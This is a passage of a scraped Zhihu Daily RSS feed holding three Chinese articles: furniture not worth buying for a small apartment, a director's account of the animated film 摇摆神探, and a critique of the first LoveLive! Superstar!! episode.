23:07:25","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-fe4c25c5119b392faea66f8dad969caa_l.jpg?source=8673f162\"><span>清单Eqingdan，</span><span>（微信公众号 ID：eqingdan）用心生活，认真花钱</span>\n<a href=\"https://www.zhihu.com/question/26495738/answer/362680148\" hidden>阅读原文</a>\n</div>\n<div>\n<p>跟你们说个事，我前几天真把我家占地的、买来再也没用过的东西全扔了，扔的时候我妈非常地心疼，但是过一会儿就缓过来了，毕竟我扔掉的这些东西真的很影响家里「风水」，例如走路磕脚、坐下吃灰、半夜被吓一跳等等…</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-89616953a1b5da5504e2228486c8dd0d_720w.gif?source=8673f162\" alt=\"\"></figure><p>在买家具这件事情上，我们都曾经为「心愿型家具」（想象家居的使用场景，买下来后完全不一样）付出过代价。</p>\n<p>我认真根据我自己的生活体验，总结了一些小户型没必要用的家具。<strong>像我家（以及现在很多年轻人刚买房）小户型房子寸土寸金，每一件家具存在的价值如果比有限的自由面积价值还低的话，那这个家具就是没必要买的</strong>。</p>\n<p>不过，毕竟是私宅，每个人的情况都不一样，<strong>答案仅供参考~</strong></p>\n<p><strong><strong>1.电视柜</strong></strong></p>\n<p>电视柜是客厅 N 件套里必备的一款家具，以前电视很大，不能上墙，电视柜还是很有用的。</p>\n<p>但现在科技发展得真的太快，壁挂式的网络电视让电视柜的原本功能没了用武之地。<strong>到现在，电视柜剩下的功能可能只有储物了</strong>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-937d5ea427c9a8426574e9093ea1239a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但是说到储物，<strong>亲身证明电视柜里放的东西我可能一年拿不上几次</strong>，只是每年年底大扫除的时候，会看一眼里面的东西有没有过期、有没有灰尘。</p>\n<p>如果你放的都是常用的东西，那电视这个位置还是很尴尬的，想象一下：在客厅里，大家都围坐在一起，你突然要拿个什么东西，然后将腚对着大家望向电视机的脸….. 哈哈哈哈，想想都脸红。</p>\n<p>如果家里比较大，买电视柜正好充实空间。<strong>但如果是小户型，电视柜不仅占地方、增加搞卫生的面积，还没什么用，所以没必要买</strong>。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-26cbca3584a7ce713c8d09ca42a272af_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Tips</strong>：如果你需要放置机顶盒，现在有壁挂式机顶盒收纳装置和搁置板，随便哪一个都比电视柜轻便。</p>\n<p><strong><strong>2.展示柜</strong></strong></p>\n<p>这个东西大家应该都会比较熟悉，早期的装修中，最爱在客厅与玄关中间做一个隔断，而最常出现的就是展示柜了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8fe2a22d8d14c249f774509bda7c204d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>事实证明，<strong>这件看上去实用性非常强的家具，最后可能就变成了鸡肋</strong>，展示柜比较大，放在小户型里占地不说，还特别容易养成坏习惯。</p>\n<p>例如回家随手放下的车钥匙或者超市大促的赠品，还有街边碰见的小杂物，都有可能<strong>使你忘了拥有它的最初目的——展示</strong>。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-d5b7a7e317ef94ac582049a0a8106b7e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>除非你是有很多藏品需要展示，否则千万别跟风买一个没有藏品的展示柜。</p>\n<p><strong>Tips</strong>：如果你希望将与客厅连在一起的玄关隔开，我比较推荐就放一个矮柜，视野宽阔还能储物。</p>\n<p><strong><strong>3.笨重的茶几</strong></strong></p>\n<p>我家的茶几是以前舅舅搬家时送过来的，因为太沉了，搬它时用上了好几个大叔的力量。小时候大家围坐在电视机前打闹欢笑，这个茶几上放满了零食。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4a818a7d56f04e3bd6ae97078bc96d11_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>可是它最后却成了眼中钉</strong>。</p>\n<p>家里人越聚越少是一个原因，还有就是因为体形较大，活动不太方便，经常磕脚；偶尔想挪开，给到家来玩的小宝宝腾出个玩耍的位置，可惜没地方放。<strong>本来客厅也不大，这么一个笨重的茶几放在中间显得空间更加局促了</strong>。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f31e7edb77785015ef404fd90638b23c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>虽然小户型需要储物功能，但有储物功能的茶几大都笨重，还容易堆满你放进去后就可能忘掉的杂物。如果家里有其他的储物柜子，建议不要买太过笨重的茶几。</p>\n<p><strong>Tips</strong>：小户型如果想显得清爽一些，建议选择镂空型或者组合型的茶几，方便挪动。</p>\n<p><strong><strong>4.衣帽架</strong></strong></p>\n<p>你可能见过一些貌美的衣帽架，幻想着有一天把它搬回家，但事实上你看见的只是它没挂衣服或者只挂了一两件衣服的样子。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a33b93e6170292cc4fec43f44147bc36_720w.jpg?source=8673f162\" alt=\"\"></figure><p>衣帽架挂几顶帽子还行，如果衣服挂多了，<strong>在小户型房子里不仅显得乱，还常常会因为重心不稳而倒下</strong>，但如果只挂一两件衣服，对于小户型来说它又<strong>真的很占地方。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-13483ff2a6cb9d13075055836beeb22b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>不怕你们嘲笑，我曾经在半夜上卫生间时，被卧室里那个顶戴帽子下挂衣服的「人形」衣帽架吓哭在被窝里。<strong>衣帽架这种东西对于小户型来说算是鸡肋了</strong>，除非你特别喜欢，否则也没必要买（我昨天把它扔掉了）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-22d86fe2ac6a52e93cfb336f786da377_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Tips</strong>：小户型脏衣服直接扔进洗衣机，不洗还穿的大衣可以挂在玄关或者衣柜里，内衣先放进脏衣篓里，方便还整洁。</p>\n<p><strong><strong>5.壁挂书架</strong></strong></p>\n<p>相信很多人跟我一样，被种草过同款壁挂书架，这种便宜好操作还逼格满满的书架曾经是我的心头好，书房装了、客厅装了、卧室也装了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b4e2c521a39207f8c011960d980b5877_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-7513873eeb315778b1b0e8dcc5c23474_720w.jpg?source=8673f162\" alt=\"\"></figure><p>直到有一天，看见好些人分享经验说，卧室床背板上面因为<strong>不堪书籍重量而折弯的壁挂书架</strong>，我真是庆幸自己动手能力差了一次。</p>\n<p>其实这种壁挂书架也就是搁置板，充当着简易版展示柜的作用，只能放一些小饰品，但是小户型的家里放着搁置板其实很不方便，容易磕着头。<strong>像图片里这种放着书啊、盆栽啊等重物的效果看看就好，别尝试，不安全</strong>。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-46cf25c925d352979386d9eb6600bfc4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-483a8bd2ea862dabdbd89bdee8d3d93a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>如果只是为了放书的目的，还不如一个小型书柜来的合适。</p>\n<p><strong>Tips</strong>：说到小型书柜，不得不说到宜家的组装型书架——毕利书架。</p>\n<p>这种书架可以根据你书籍的多少随意组装，毕竟是小户型，若是书籍暂时不多，可以用它来储存，等到藏书增多时，可以随时增加额外的容量，非常的方便。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-556aa79f6d33ba7ff234c1898090f5cd_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>6.床尾凳</strong></strong></p>\n<p>床尾凳有着防止被子滑落、放衣服、避免客人坐床上的尴尬等作用，以前是给贵族用的，很多宫廷风装修里也会用到。但是到了现在，很多北欧风里也出现了床尾凳，只是造型没有那么浮夸。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8b39cea8c0e843b5f9e2c25c4c84059d_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>床尾凳是我列举这几款家具里的鸡肋之最</strong>，大户型卧室面积大，放一个床尾凳刚好缓解房间的空荡。但是小户型放床尾凳无疑是在给自己找麻烦，<strong>放衣服显乱，走路碍脚，还缩小卧室活动空间</strong>等等。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-b6eb2b1cd1280739fe751a93939534eb_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Tips</strong> :床尾凳除了凸显贵族气息外，暂时没有找到非它不可的使用功能。小户型卧室中，如果要放衣服，<strong>建议买一款小衣篓</strong>，放置隔夜衣物很方便。</p>\n<p><strong><strong>7、懒人沙发</strong></strong></p>\n<p>算是争议比较大的一个爆款家具，喜欢它的人如获珍宝，不喜欢它的人买完就开始后悔。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-59188bac89e7fb831054f573f14cebb5_720w.jpg?source=8673f162\" alt=\"\"></figure><p>喜欢它的人觉得，配上地毯躺在上面可以很舒服地欣赏电影。不喜欢的人理由各有千秋，例如：</p>\n<p><strong>“因为已经有了沙发，买回来就没用过几次，最后还得不停地给它打扫卫生。”</strong></p>\n<p><strong>“每天都很忙，没机会躺在上面浪费时间，最后变成了储物工具，上面全是衣服。”</strong></p>\n<p><strong>“喜欢玩手机和电脑，但是懒人沙发没有支撑颈椎的东西，每次躺完以后脖子都非常酸痛！”</strong></p>\n<p><strong>“陷进去就起不来了….”</strong></p>\n<p>因为没有支撑，坐在懒人沙发上长时间玩手机，<strong>确实会影响到自己的脊椎、颈椎，对健康是一种损害</strong>，卫生也要看个人。如果你非常的忙又怕麻烦，还是不要跟风，买适合自己的家具才好。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cfc649e96a13b1eab64fd2479570de5a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>Tips</strong>：如果你没有上述情况，为了健康着想，若想舒服地躺在上面，建议配合着地毯使用 (别躺上面玩手机）。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/26495738\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738176"},{"title":"如何评价动画电影《摇摆神探》？","date":"2021-07-16 15:30:10","description":"\n<p>感谢邀约，由我导演的动画电影《摇摆神探》明天7月17日就要上映了，回想当时为什么会做这部电影、还有团队创作中的过程的很多人，很多事、感受颇多，想和大家分享一些创作这部电影时的初衷。《摇摆神探》以摇摇车为主⾓的动画电影，讲的是⼀辆幻想自己是“英雄”的、与众不同的摇摇车“摇摆”是如何从绑匪⼿中营救男孩“小奇”的历险故事。电影概念是以儿童守护陪伴的主题， 创作初衷，是希望向传递，孩子童年成长过程中不可或缺的亲情守护陪伴……</p>\n<p>以下内如部分略微涉及剧透：</p>\n<p>男孩“⼩奇”和摇摇车“摇摆”是在游乐园相遇，原本一家人相约游乐场，父母又因工作中途缺席，小奇自己进入了游乐场，却被早有预谋的绑匪盯上。</p>\n<p><b>游乐园形单影只的男孩，像是是当下很多家庭现状的影子……</b>男孩“⼩奇”的⽗母整体忙于工作，对他疏于陪伴，这像是当今很多家庭的现状：每个孩子的童年都一段短暂、宝贵、独特的成长时光，这段时光的亲情陪伴对孩子的成长塑造不可或缺，孩子也会因缺乏这份陪伴而孤独。 </p>\n<p>影片中，在男孩小奇生日当天，原本一家⼈相约游乐园，⽗母却又因⼯作忙碌中途缺席。虽然父母日常忙于事业，早已在物质方面为小奇配备了高端玩具、电子设备、保镖看护等等，大多数人看来孩子这样的童年生活已经很丰富了。然而，成长路上长期缺乏陪伴的孩子并不会真正的快乐，大人们时常因忙碌难以倾听孩子内心的真实感受、容易忽视孩子渴望陪伴的诉求。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a3f62cc80cfd0b169360aa775591626c_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5713\" data-rawheight=\"2480\" data-watermark=\"watermark\" data-original-src=\"v2-a3f62cc80cfd0b169360aa775591626c\" data-watermark-src=\"v2-d600674d86c242832e7de0b6ac3c77d3\" data-private-watermark-src=\"v2-c03f7ddda729d85b175130fd20b487d9\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-852324bb7142fa5d01e9dacce5c4c1ab_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-852324bb7142fa5d01e9dacce5c4c1ab\" data-watermark-src=\"v2-6bb8ea6f29136a63847e99825c125280\" data-private-watermark-src=\"v2-bdd62cf3f8a6316ebfbde891b96e7bf2\"></p>\n<p>顺带插一句：男孩小奇的形象设计，参考并融合了现实中多位明星童年出道时的样子，大家觉得像哪一位？</p>\n<p>原本一场全家人欢乐的游玩，父母却突然缺席，此刻小奇仍然是孤独的，但男孩不理解自己不开心的深层原因，而是选择了自己去寻找答案：小男孩不知不觉独自来到了游乐园……他在游乐园遇见了很多新奇好玩的设施玩具、也遇到了其他陪伴孩子玩耍的三口之家，更遇见了童年的摇摇车，回忆起很小的时候自己坐在摇摇车上，父母在旁陪伴嬉闹的情形。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9a95645d7315142ef52fe47e672a9b0f_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-9a95645d7315142ef52fe47e672a9b0f\" data-watermark-src=\"v2-549e78a6df9bf5898adb1483127fa83f\" data-private-watermark-src=\"v2-f83f67373c83ace25abc773adfe3e9b1\"></p>\n<p><br></p>\n<p>这段电影剧情，男孩小奇与神奇摇摇车“摇摆”看似不期而遇，实则充满必然！因为游乐园往往正是孩子在家人陪伴下的游玩场所，这种亲情陪伴是小奇内心潜在的强烈诉求，而这些看似简单的童年守护陪伴正是当今的孩子、父母所需的。</p>\n<p>在电影后续剧情中，男孩遭遇绑匪，摇摇车挺身而出开展营救，他们一起与坏人在游乐园展开周旋，开启了一场紧张而欢乐的冒险。摆脱危险困境后，在傍晚落日下的海边沙滩，摇摇车更化身为男孩的快乐陪伴担当。此时此刻，摇摇车“摇摆”所扮演的守护孩子安全、暖心欢乐陪伴等等一系列举动，不正是父母在孩子童年成长中不可或缺的守护陪伴？</p>\n<p><b>这段摇摇车营救故事，想传递童年里不可或缺的亲情守护陪伴  </b>如今快生活节奏大环境下，家庭娱乐的方式越来越多，很多父母也愈加习惯用物质方式解决孩子成长路上的问题，如更智能的玩具、早教、电子产品等等，在这样的大环境下，孩子也在快速成长并学会自己解决问题、寻找答案。如之前说的，每个孩子的童年都一段短暂、宝贵、独特的成长时光，而这段父母亲情守护陪伴的记忆和对孩子的影响，即使多年后孩子长大了仍然深刻……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0577e9724a33c970a67af88dc58ab999_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1409\" data-rawheight=\"748\" data-watermark=\"watermark\" data-original-src=\"v2-0577e9724a33c970a67af88dc58ab999\" data-watermark-src=\"v2-41fa95c1423c730ca0b565e5802ba6c8\" data-private-watermark-src=\"v2-d49e029ed11dce689a07615580f2b1c9\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c1fcecbac6e7d5e0206e1d3a1b4c3342_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"858\" data-watermark=\"watermark\" data-original-src=\"v2-c1fcecbac6e7d5e0206e1d3a1b4c3342\" data-watermark-src=\"v2-a35d08dc42c66ddd638a9cc2d4cff43c\" data-private-watermark-src=\"v2-4ff692503e44957b486a01b7b54ce898\"></p>\n<p>我本人是79年的、还有编剧邓伟峰等创作团队成员都是80后，其实吧，那个年代的孩子大多经历过类似的童年孤独状态：比如父母忙于工作、时常让孩子一个人在家，因为大多是独生子，孩子本就缺少兄弟姐妹成长陪伴、却常与玩具作伴……</p>\n<p>在那个电子娱乐缺乏的年代，虽然没有当下那么丰富的娱乐方式，但对童年成长过程中、那段父母陪伴的记忆都尤为深刻！那时候的童年快乐很简单，即使父母偶尔陪孩子公园玩一天，真的能高兴很久很久</p>\n<p> 《摇摆神探》讲的是神奇摇摇车去营救男孩的欢乐冒险故事，而电影想传递的童年守护陪伴、不只是守护儿童的身心安全，更是孩子成长路上不可或缺的父母亲情陪伴！这年头啊，每个家庭在品类繁杂的城市娱乐中有了更多选择，父母陪孩子玩摇摇车的情形小时候到时很常见到……现在还多吗?</p>\n<p>这一次，曾经陪伴无数人童年的摇摇车在电影里“活”了，我想对于很多像我们这样的大孩子来说也算是一种童年追忆吧。</p>\n<p>好了 ，不知不觉说了那么多  ，我们在设计摇摇车“摇摆”的故事时出过很多有趣的想法，感触很多，看着大伙做了这么久的片子明天就要上映了，希望大家喜欢，可能会从中回忆起什么也说不定，希望大家都能从中得到快乐</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhu-jiang-6-41?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">凨木猪</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/469062064/answer/2002161426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20685563?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">电影《神探》中刘青云看到人心里的鬼，为什么出主意的都是女性？</a><br><a href=\"http://www.zhihu.com/question/49325102?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价香港电影《神探》？</a><br>\n","link":"http://www.zhihu.com/question/469062064/answer/2002161426?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价2021七月新番《LoveLive! Superstar!!》？","date":"2021-07-16 11:30:10","description":"\n<p>星团的第一集从我个人的角度来说，属于是那种你能感受到许多不同于正面战场前两作，能够一些新鲜空气的单集;是能感受到在虹色游击队(虹咲企划在所谓法统层面上相对缺少一些继承关系)与法统爱生活完成统一战线与法统梳理下，虹军游击队的讲习所对正面战场带来积极作用的单集。</p>\n<p>但是星团的第一集同样让我觉得是一个在新鲜感褪去进入到激情的思考时会怀疑是否真的在起点完成了一部分革新的单集;是察觉到结构变化反倒很大程度上影响到作品情绪抒发与剧情感官的单集;也是总感觉缺少一块足够的长板去让人忘记不足的单集。</p>\n<p><b>总结性的预言一下，我觉得星团既很可能是法统核心里最适合于今天的那一个，也很可能成为爱生活系列的“清末新政”的那一个，但基本不可能完成达到为爱生活系列带来各种积极方面大幅扭转的那一个，能不能赶上虹色游击队都需要祈祷花田能在自己擅长的方向发挥正常＋企划本身的条条框框能少一点以及足够的配置与运气。（注：笔者真不懂爱生活，没玩过LLAS，虽然奉行雨野罪大恶极但是也不算熟悉剧情，一切对照都基于动画本体）</b></p>\n<hr>\n<ol>\n<li><b>告别了废校废部是否意味着改变了启动机制？？</b></li>\n<li><b>当传统的中段变成开头时，能否得到足够的回应？</b></li>\n<li><b>鲤鱼，此刻最大的短板，却不只是她的问题</b></li>\n<li><b>其他与总结</b></li>\n</ol>\n<h2>1.告别了废部废校是否意味着改变了启动机制？</h2>\n<p>许多朋友在谈论星团的第一集的时候，都会以本作第一集没有再提废部废校设定而把这个作为一个巨大的突破，emmmm，也许在玩梗方面你说的对，但是小声说一句:<b>《lovelive sunshine》的第一集也没有废部废校，类似的内容也只有学生会会长断然拒绝，果南对此支支吾吾。</b>而在星团第一集中，同样有学生会长严词拒绝，能否说真的告别了都难说。</p>\n<p>而且比形制上的废校废部来说，我们首先应该来看待另外一个问题：“在LL系列之中，被视为模板套皮的废部废校，是否每一次都起到了相似的作用，是否都是启动机制的一部分”。</p>\n<p>在缪中，的确音乃木阪的废校与为了让新入学人数增加而创办学园偶像部成为了果皇一切的切入点与传奇的起点。但是，不论是后续LLSS的浦女，还是虹咲会展中心兼国际机场，作品本身切入到学园偶像的起点本质上都是一个——<b>“薪火相传的感染力”</b>。</p>\n<p>浦女的学园偶像部的remake，其由头是蜜柑姐被缪斯的歌舞给dokidoki了，在蜜柑姐强大的精神属性与“死皮赖脸”的安利之下，成功将事态与旧有传统体系性危机——废校结合，同时击鼓传花一般的将问题切入到三年级三人组的旧有恩怨情仇。从复盘的角度，我们当然应该说，浦女的废校危机当然在在你水的重启中起到了重要作用，但是从整个启动机制来看，由头已经从缪系列废校废部为基础与源动力变成了一种戏剧性与偷梗的部分。在我看来，如果将有无废校废部就看做机制改进，那么我觉得将废校废部进行弱化矛盾，取消其核心源头的水团其实已经在reform的道路上走了一大步，甚至很大程度上，就第一集的启动逻辑来看，星团其实高度继承地是水团（但是确实在一些不常提到的地方有了不小变化）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-13b5d6b4792968990f9f5243abafdce5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-13b5d6b4792968990f9f5243abafdce5\" data-watermark-src=\"v2-ec326f5b9cb84a1bf1ce34da4b969f49\" data-private-watermark-src=\"v2-febe000c23ef8e40a27556a2cc1d2142\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-54e06a73c8de0f664f39496e9970672b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-54e06a73c8de0f664f39496e9970672b\" data-watermark-src=\"v2-6aea0214462003637922d04001aeaaa6\" data-private-watermark-src=\"v2-40752a86f1fdd93d55166bfef1db06a0\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-786249486f38cfe2e3c265d20e9b466f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-786249486f38cfe2e3c265d20e9b466f\" data-watermark-src=\"v2-f2de123a7ef3ebfd706ae8851875617d\" data-private-watermark-src=\"v2-d55eb819c80f86df33927c4972be31e0\"></p>\n<p>在启动机制方面，虹色游击队在我看来事实上算是我眼中改革更激进的那一个，但这一点也是因为其组织结构方面的完全差异性带来的，即“相较于缪的从零开始，水的断代重建，虹团动画的起点便是虹咲学园偶像同好会的骤然废部，此时其旧有框架完全保留，并不需要再上井冈山”。</p>\n<p>所以虹团的剧情起点是侑和步梦的闲聊逛街，被雪菜精彩的表现所感染而完成的传承，此处相当程度上继承了水团以来利用传承去构建由头的逻辑。但在本集按照一般校园社团番中的纠结与自我说服附带上废部的戏剧性之后，本集除去百合气息外最有特色的便是因为本集的节点选择，让其最后能以一串足够漂亮的群像剧剪影将同好会旧部的情况与废部的紧急事态相结合，甚至最后也因此将虹团第二集拍成了《第五共和国》似的小霞霞另立核心，带来了许多真正配得上意想不到却在合理之中充满着喜剧意味的戏剧性玩意儿。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-a2496734361887379a6e6275b6b68067_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-a2496734361887379a6e6275b6b68067\" data-watermark-src=\"v2-00efedd306ea72afe77d59c49a754d62\" data-private-watermark-src=\"v2-4408c68a348bed89bd687bd190a45439\"></p>\n<p>那么星团呢？从第一集来看，至少从团队的启动层面来看，星团的启动机制近乎完全继承了水团以来<b>感染力的继承</b>这一核心逻辑，也与水团一样在主要矛盾尚未出现之时，便已经因为某一个“传教士”开启了剧情的运转，只不过这一次属于是西风东渐了（毕竟沪国当然在你日西边）</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9742d758830a8206178c3af74514ef9a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-9742d758830a8206178c3af74514ef9a\" data-watermark-src=\"v2-36e005bd9007d171e271d03e5fb2c983\" data-private-watermark-src=\"v2-f15e66917a120210ba5a2cdada24875f\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dd79f0e54af8a12fa19b8dd706d2724c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-dd79f0e54af8a12fa19b8dd706d2724c\" data-watermark-src=\"v2-81475b6ece48eb93749770882d631192\" data-private-watermark-src=\"v2-1f11c12d65108a3bb638251c7a9109ab\"></p>\n<p>在第一部分的最后还剩下一个问题，那便是“<b>什么是废校与废部？</b>”</p>\n<p>这一点看起来几乎没什么意义，但是作为一个干啥啥不行，就会和你掰扯来掰扯去概念的家伙，我觉得与其去抱怨为什么社团作品总是在废校、废部、找不齐人的矛盾，京吹那里搞一点“体育系社团阶级问题”都能时至今日变成ACG社区办公室政治与隐射文学的不倒素材，倒不如去想什么是。</p>\n<p>在笔者看来，废校废部这样的样板矛盾，本质上是“<b>利用一种强大而至少在矛盾初期难以被解决与解释的大而无当，或者是不需要知道有没有的外部压力，亦或是一定程度上的“他者”的凝视，来对剧情的运行去进行加速与规制</b>”。那么在这样的逻辑之下，现在的问题就变成了，这样的外部干预，究竟与LL系列中宛如世界真理一样的“<b>必然出现的对学园偶像抗拒的学生会长</b>”有着怎么样的区别了。</p>\n<p>而在我看来，这两者如果真的有什么区别，那大概便是<b>必然抗拒的学生会长</b>在LL系列中在完成了某种程度上的共情之后，便迅速地从一个本不存在的他者回归到团体内成员构建的想象界，并且进而在后续的个人部分让观众以一种错觉的认识去从一种拟态的“从想象界到实在界”的过程来获得观众对自身的投射。而不论是废校，废部，还是传统LL的lovelive大赛与绝大多数状态下的“敌团”，他们都基本上以一种他者的身份置于剧情之中，而最终LL的本体二团也确实在一系列他者的凝视之下，以一种强烈的规制及其驱力来运行。</p>\n<p>在这样的思路之下，废校废部的设计，与lovelive大赛亦或是一个遥远的目不可及的敌团来看，也没有什么明显的区别。而对比虹团初期与星团第一集中，lovelive project的宣传，广告板上隐隐约约的敌团要素，从合理推测的角度来看，纵使不再废部废校，在初期的构建中，依然具有着传统意义上管理层的科层制矛盾，在后续的发展中，依然具有着整套机制的他者凝视，其大体的方向也就八九不离十。</p>\n<p>毕竟，虹色游击队的前辈们，在第三集后相当程度上告别了这种主线剧情中的他者凝视之后给出的答案就是不断重复着一次又一次“从想象界到实在界”的拟态演出，最后用制造一个大他者（指打算开一个大聚会的计划）来完成对这种规制的回归。</p>\n<h3><b>2.当传统的中段变成开头时，能否得到足够的回应？</b></h3>\n<p>虽然上一部分从各种逻辑论证了对于改变废校废部逻辑的过度抬高的不合理，但是真的要说星团的第一集没有什么突破也确实不太对劲。</p>\n<p>在我看来，星团第一集最大的两个突破，第一个是将传统偶像作品的个人回的深层矛盾处置进行了一个激进的前置；第二个便是完成了立德与宣传机器分离。第二点与第三部分关系更紧暂且不提，先来说第一点。</p>\n<p>对照LL系列或者其他偶像动画的开篇，对于成团型偶像动画来说，初期，至少第一集的内容基本上都是既有团队的拉人+邂逅+团内人员过脸熟；而已成团的类型则也不太可能整的跟纯个人回一样似的，而也应该把第一集作为对于全团的展现与核心C位的强化。纵使是对于虹咲这种本质本格校园社团番+百合向的偶像作品，其在面对堪称本作真正主轴的侑与步梦的情感部分，本作的第一集也只是用一些迟疑和最后表层的共同意识来体现双方情感的不对等与后续的矛盾预定</p>\n<p><img src=\"https://pic1.zhimg.com/v2-60c199b712cadcfe1bfd19b05788784e_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-60c199b712cadcfe1bfd19b05788784e\" data-watermark-src=\"v2-588a55f87a505f8935e49e1055e6d291\" data-private-watermark-src=\"v2-94d0d30e10fab5f8e85a8333675e0ac6\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-28b0420af5fd21888cc4e06ca54ca308_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-28b0420af5fd21888cc4e06ca54ca308\" data-watermark-src=\"v2-2229f99e3420a09b510278f9647c3a1d\" data-private-watermark-src=\"v2-c9369a4b87a46c6db6cabf8d36312fa1\"></p>\n<p>而星团的第一集，则很大程度上扎了一个马扎，狠狠地向着对个体层面的深刻矛盾的展现与解决迈了一大步，单集的开始便是团队leader香音的回忆部分，确实很出色地将香音这个角色从典型的ll系立德的超元气，精神属性超强变成了美洲杯夺冠之前各大足球论坛里面的梅西——天赋满满，人人都觉得肯定能国家队大满贯，但是大赛关键场次软脚虾，精神属性堪忧的非正常LL立德，这个是本单集的第一个亮点，很可能也是本集最让笔者有期待的地方。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6bb75bb5abc00c14c169dde94b63d41d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-6bb75bb5abc00c14c169dde94b63d41d\" data-watermark-src=\"v2-14fcbaefc69ff16f21be699438e7a02f\" 